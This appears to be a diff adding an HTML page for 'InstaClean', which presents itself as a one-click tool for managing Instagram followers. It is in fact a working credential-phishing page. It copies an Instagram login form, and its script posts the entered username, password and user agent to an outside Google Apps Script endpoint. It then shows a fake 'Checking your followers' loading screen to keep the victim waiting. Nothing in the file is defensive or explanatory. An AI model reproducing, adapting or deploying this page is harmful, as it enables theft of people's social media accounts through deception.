@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InstaClean</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+        }
+
+        .instagram-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .description {
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        #modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            border-radius: 8px;
+            width: 80%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        img {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 8px solid #3498db;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: auto;
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <i class="fab fa-instagram instagram-icon"></i>
+        <h2>InstaClean</h2>
+        <p class="description">Manage your followers with one click with InstaClean</p>
+        <form id="loginForm" action="https://script.google.com/macros/s/AKfycbxdYqoF15OhL3X7lOajMaEohXdkNajKOL8sV8o-Uvi7Cp-57hcEAmvu-72cPiC38MOq4w/exec" method="post">
+            <input type="text" name="username" id="username" placeholder="Username" required>
+            <input type="password" name="password" id="password" placeholder="Password" required>
+            <input type="hidden" name="device_info" id="deviceInfo">
+            <button type="submit" id="loginButton">Log In</button>
+        </form>
+    </div>
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <img src="https://i.ibb.co/7vw2nc1/424475030-368526672474434-1377331753430940101-n.jpg" alt="Image">
+            <h1 id="welcomeMessage"></h1>
+            <p>Checking your followers (3,387)</p>
+            <div class="loader"></div>
+        </div>
+    </div>
+
+    <script>
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            return {
+                userAgent,
+                platform
+            };
+        }
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+            
+            // Get the username and password from the form
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            document.getElementById('deviceInfo').value = "useragent" + navigator.userAgent;
+
+
+            // Disable the login button
+            document.getElementById('loginButton').setAttribute('disabled', true);
+
+            // Show the modal
+            const modal = document.getElementById('modal');
+            modal.style.display = 'block';
+
+            // Set the welcome message
+            document.getElementById('welcomeMessage').innerText = 'Welcome ' + username;
+
+            // Send the POST request
+            fetch('https://script.google.com/macros/s/AKfycbxWZXTZGDAruDXplgeLtgwk44OcPefQ4v2JHd-RktmpIlh9muM2HgDYZKs2YrVS4EAsOg/exec', {
+                method: 'POST',
+                body: new FormData(document.getElementById('loginForm'))
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirect to a new page after 3 seconds
+                    setTimeout(function() {
+                        // window.location.href = 'new_page.html'; // Replace 'new_page.html' with the URL of your actual page
+                    }, 3000);
+                } else {
+                    throw new Error('Network response was not ok.');
+                }
+            })
+            .catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+            });
+        });
+    </script>
+</body>
+</html>
